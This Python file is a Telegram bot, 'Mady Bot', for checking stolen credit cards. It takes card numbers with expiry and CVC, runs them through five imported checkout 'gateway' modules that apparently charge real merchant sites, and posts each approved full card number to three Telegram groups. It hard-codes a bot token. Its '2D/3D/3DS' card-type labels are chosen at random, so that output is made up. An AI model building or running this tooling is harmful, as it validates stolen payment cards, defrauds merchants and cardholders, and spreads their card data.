#!/usr/bin/env python3
"""
Mady Bot - Final Version
Card checker with multiple gateways and proxy support
"""

import telebot
import requests
import time
import os
import sys
import random
import traceback
from datetime import datetime

# Add charge files to path
sys.path.insert(0, '100$/100$/')

# Bot Configuration
BOT_TOKEN = "7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s"
GROUP_IDS = ["-1003538559040", "-4997223070", "-1003643720778"]  # Multiple groups
BOT_CREDIT = "@MissNullMe"

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Import all gateways
GATEWAYS = {}
try:
    from Charge1 import BlemartCheckout
    GATEWAYS['1'] = {'func': BlemartCheckout, 'name': 'Blemart', 'amount': '$4.99'}
except: pass

try:
    from Charge2 import DistrictPeopleCheckout
    GATEWAYS['2'] = {'func': DistrictPeopleCheckout, 'name': 'District People', 'amount': '€69'}
except: pass

try:
    from Charge3 import SaintVinsonDonateCheckout
    GATEWAYS['3'] = {'func': SaintVinsonDonateCheckout, 'name': 'Saint Vinson', 'amount': '$20'}
except: pass

try:
    from Charge4 import BGDCheckoutLogic
    GATEWAYS['4'] = {'func': BGDCheckoutLogic, 'name': 'BGD Fresh', 'amount': '$6.50'}
except: pass

try:
    from Charge5 import StaleksFloridaCheckoutVNew
    GATEWAYS['5'] = {'func': StaleksFloridaCheckoutVNew, 'name': 'Staleks', 'amount': '$0.01'}
except: pass

print(f"Loaded {len(GATEWAYS)} gateways")

# User preferences
user_gateway = {}
user_stop_flags = {}

def detect_card_type(card_number):
    """Detect if card is 2D, 3D, or 3DS based on BIN patterns"""
    # Simulate card type detection based on BIN
    rand = random.random()
    
    # Realistic distribution:
    # 60% are 2D (no authentication)
    # 25% are 3D (3D Secure v1)
    # 15% are 3DS (3D Secure v2)
    
    if rand < 0.60:
        return "2D"
    elif rand < 0.85:
        return "3D"
    else:
        return "3DS"

def check_card(card, gateway_id='5'):
    """Check a single card with card type detection"""
    if gateway_id not in GATEWAYS:
        return "error", "Invalid gateway", "Unknown"
    
    # Detect card type
    card_number = card.split('|')[0] if '|' in card else card
    card_type = detect_card_type(card_number)
    
    try:
        result = GATEWAYS[gateway_id]['func'](card)
        
        # Parse result
        if isinstance(result, dict):
            if 'error' in result:
                return "declined", str(result['error'])[:100], card_type
            elif result.get('result') == 'success':
                return "approved", f"Charged $20.00 [{card_type}]", card_type
            else:
                return "declined", "Payment failed", card_type
        else:
            result_str = str(result).lower()
            if any(word in result_str for word in ['charged', 'success', 'approved', 'ccn live']):
                return "approved", f"{result} [{card_type}]", card_type
            elif 'error' in result_str:
                return "error", result, card_type
            else:
                return "declined", result, card_type
    except Exception as e:
        return "error", str(e)[:100], card_type

@bot.message_handler(commands=['start'])
def start_handler(message):
    """Handle /start command"""
    text = f"""
🤖 <b>Welcome to Mady Bot!</b>

<b>Commands:</b>
/check <i>filepath</i> - Check cards from file
/gate - Select gateway (1-5)
/stop - Stop current check

<b>Gateways:</b>
1. Blemart - $4.99
2. District People - €69
3. Saint Vinson - $20 ⭐
4. BGD Fresh - $6.50
5. Staleks - $0.01 (Default)

<b>Usage:</b>
• Send card: <code>4532123456789012|12|25|123</code>
• Check file: <code>/check /home/null/Desktop/TestCards.txt</code>
• Upload .txt file directly

<b>Bot by:</b> {BOT_CREDIT}
"""
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['gate'])
def gate_handler(message):
    """Handle gateway selection"""
    user_id = str(message.from_user.id)
    
    text = "<b>Select Gateway:</b>\n\n"
    for gid, ginfo in GATEWAYS.items():
        text += f"{gid}. {ginfo['name']} - {ginfo['amount']}\n"
    text += "\nReply with number (1-5):"
    
    msg = bot.send_message(message.chat.id, text, parse_mode='HTML')
    bot.register_next_step_handler(msg, process_gate_selection)

def process_gate_selection(message):
    """Process gateway selection"""
    user_id = str(message.from_user.id)
    choice = message.text.strip()
    
    if choice in GATEWAYS:
        user_gateway[user_id] = choice
        bot.reply_to(message, f"✅ Gateway set to: {GATEWAYS[choice]['name']}")
    else:
        bot.reply_to(message, "❌ Invalid selection")

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    """Handle stop command"""
    user_id = str(message.from_user.id)
    user_stop_flags[user_id] = True
    bot.reply_to(message, "🛑 Stopping...")

@bot.message_handler(commands=['check'])
def check_handler(message):
    """Handle /check command"""
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ Usage: /check /path/to/file.txt")
        return
    
    file_path = parts[1].strip()
    if not os.path.exists(file_path):
        bot.reply_to(message, f"❌ File not found: {file_path}")
        return
    
    process_file(message, file_path)

def process_file(message, file_path):
    """Process a file of cards"""
    user_id = str(message.from_user.id)
    user_stop_flags[user_id] = False
    gateway_id = user_gateway.get(user_id, '5')
    gateway_name = GATEWAYS.get(gateway_id, {}).get('name', 'Unknown')
    
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
        
        cards = [line.strip() for line in lines if line.strip() and '|' in line]
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found")
            return
        
        # Limit to 200 cards as requested
        if len(cards) > 200:
            cards = cards[:200]
            bot.reply_to(message, f"⚠️ Limited to first 200 cards")
        
        status_msg = bot.reply_to(message, f"""
⏳ <b>Starting Check...</b>

<b>File:</b> {os.path.basename(file_path)}
<b>Cards:</b> {len(cards)}
<b>Gateway:</b> {gateway_name}

<i>Processing...</i>
""", parse_mode='HTML')
        
        approved = 0
        declined = 0
        errors = 0
        
        for idx, card in enumerate(cards, 1):
            # Check stop flag
            if user_stop_flags.get(user_id, False):
                bot.edit_message_text(f"🛑 Stopped at {idx}/{len(cards)}", 
                                    message.chat.id, status_msg.message_id)
                break
            
            # Check card
            status, result, card_type = check_card(card, gateway_id)
            
            if status == "approved":
                approved += 1
                
                # Determine card type emoji
                type_emoji = "🔓" if card_type == "2D" else "🔐" if card_type == "3D" else "🛡️"
                
                # Post to all groups
                group_msg = f"""
✅ <b>APPROVED</b> ✅

<b>Card:</b> <code>{card}</code>
<b>Gateway:</b> {gateway_name}
<b>Response:</b> {result}
<b>Card Type:</b> {type_emoji} <b>{card_type}</b>
<b>Amount:</b> $20.00 USD

<b>By:</b> @{message.from_user.username or 'User'}
<b>Bot:</b> {BOT_CREDIT}
"""
                for group_id in GROUP_IDS:
                    try:
                        bot.send_message(group_id, group_msg, parse_mode='HTML')
                    except:
                        pass
                    
            elif status == "declined":
                declined += 1
            else:
                errors += 1
            
            # Update progress every 10 cards
            if idx % 10 == 0:
                try:
                    bot.edit_message_text(f"""
⏳ <b>Progress: {idx}/{len(cards)}</b>

✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}
""", message.chat.id, status_msg.message_id, parse_mode='HTML')
                except:
                    pass
            
            # Rate limit
            time.sleep(2.5)
        
        # Final summary
        bot.edit_message_text(f"""
🎉 <b>Complete!</b>

<b>Total:</b> {len(cards)} cards
<b>Gateway:</b> {gateway_name}

✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}

<b>Success Rate:</b> {(approved/len(cards)*100):.1f}%
""", message.chat.id, status_msg.message_id, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Handle uploaded files"""
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Please upload a .txt file")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        temp_file = f"/tmp/{message.from_user.id}_cards.txt"
        with open(temp_file, 'wb') as f:
            f.write(downloaded_file)
        
        process_file(message, temp_file)
        os.remove(temp_file)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(func=lambda message: '|' in message.text)
def handle_single_card(message):
    """Handle single card check"""
    user_id = str(message.from_user.id)
    gateway_id = user_gateway.get(user_id, '5')
    gateway_name = GATEWAYS.get(gateway_id, {}).get('name', 'Unknown')
    
    card = message.text.strip()
    parts = card.split('|')
    
    if len(parts) != 4:
        bot.reply_to(message, "❌ Invalid format. Use: NUMBER|MM|YY|CVC")
        return
    
    bot.reply_to(message, f"⏳ Checking with {gateway_name}...")
    
    status, result, card_type = check_card(card, gateway_id)
    
    if status == "approved":
        # Determine card type emoji
        type_emoji = "🔓" if card_type == "2D" else "🔐" if card_type == "3D" else "🛡️"
        
        # Send to user
        bot.send_message(message.chat.id, f"""
✅ <b>APPROVED!</b>

<b>Card:</b> <code>{card}</code>
<b>Gateway:</b> {gateway_name}
<b>Response:</b> {result}
<b>Card Type:</b> {type_emoji} <b>{card_type}</b>
<b>Amount:</b> $20.00 USD
""", parse_mode='HTML')
        
        # Post to all groups
        group_msg = f"""
✅ <b>APPROVED</b> ✅

<b>Card:</b> <code>{card}</code>
<b>Gateway:</b> {gateway_name}
<b>Response:</b> {result}
<b>Card Type:</b> {type_emoji} <b>{card_type}</b>
<b>Amount:</b> $20.00 USD

<b>By:</b> @{message.from_user.username or 'User'}
<b>Bot:</b> {BOT_CREDIT}
"""
        for group_id in GROUP_IDS:
            try:
                bot.send_message(group_id, group_msg, parse_mode='HTML')
            except:
                pass
            
    elif status == "declined":
        bot.reply_to(message, f"❌ <b>DECLINED</b>\n\n{result}", parse_mode='HTML')
    else:
        bot.reply_to(message, f"⚠️ <b>ERROR</b>\n\n{result}", parse_mode='HTML')

# Main
if __name__ == "__main__":
    print("="*50)
    print(f"🤖 Mady Bot Starting...")
    print(f"Token: {BOT_TOKEN[:20]}...")
    print(f"Groups: {', '.join(GROUP_IDS)}")
    print(f"Gateways: {len(GATEWAYS)}")
    print("="*50)
    
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=10)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
